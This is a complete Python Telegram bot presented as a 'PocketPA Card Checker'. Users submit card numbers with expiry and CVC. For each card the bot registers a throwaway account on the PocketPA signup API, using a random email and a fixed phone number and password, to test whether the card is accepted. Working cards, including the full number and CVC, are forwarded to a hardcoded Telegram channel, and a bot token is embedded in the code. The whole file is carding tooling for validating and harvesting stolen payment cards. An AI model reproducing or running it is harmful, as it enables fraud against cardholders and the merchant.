import telebot
import requests
import random
import string
import urllib.parse

POCKETPA_BOT_TOKEN = "7194711538:AAHr734HrJWS7fub791CMhyJpDlDCcrF2ww"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(POCKETPA_BOT_TOKEN)

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
        return None
    return card_number, exp_month.zfill(2), exp_year, cvc

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 PocketPA Card Checker\n"
        "Send card in this format:\n"
        "CardNumber|MM|YY|CVC\n"
        "CardNumber|MM|YYYY|CVC\n"
        "Example:\n4242424242424242|05|25|123"
    )

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    try:
        parsed = parse_card_input(message.text)
        if not parsed:
            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")

        card_number, exp_month, exp_year, cvc = parsed
        if len(exp_year) == 2:
            exp_year = "20" + exp_year

        email = generate_random_email()
        phone = "+13144740467"
        zip_code = "BA3 HAL"

        with requests.Session() as session:
            # Step 1: Get CSRF cookie and session cookies
            session.get(
                "https://api.pocketpa.com/sanctum/csrf-cookie",
                headers={
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )
            raw_token = session.cookies.get("XSRF-TOKEN", "")
            xsrf_token = urllib.parse.unquote(raw_token)

            payload = {
                "name": "Telegram User",
                "email": email,
                "phone": phone,
                "country_code": "1",
                "password": "TempPass123!",
                "locale": "en",
                "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
                "zip_code": zip_code,
                "is_affiliate": False,
                "card": {
                    "number": card_number,
                    "exp_month": exp_month,
                    "exp_year": exp_year[-2:],
                    "cvc": cvc
                }
            }

            response = session.post(
                "https://api.pocketpa.com/api/register",
                json=payload,
                headers={
                    "x-xsrf-token": xsrf_token,
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "content-type": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )

            try:
                resp_json = response.json()
            except ValueError:
                resp_json = response.text

            if (isinstance(resp_json, dict) and (resp_json.get("status") == "success" or response.status_code == 201)):
                success_msg = (
                    f"✅ PocketPA Payment Successful!\n"
                    f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
                    f"Email: {email}\n"
                    f"Full Response:\n{resp_json}"
                )
                bot.reply_to(message, "✅ Your Card Was Added")
                bot.send_message(CHANNEL_ID, success_msg)
            else:
                if isinstance(resp_json, dict):
                    error_message = resp_json.get('message', str(resp_json))
                else:
                    error_message = resp_json
                bot.reply_to(message, f"❌ Declined or error: {error_message}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()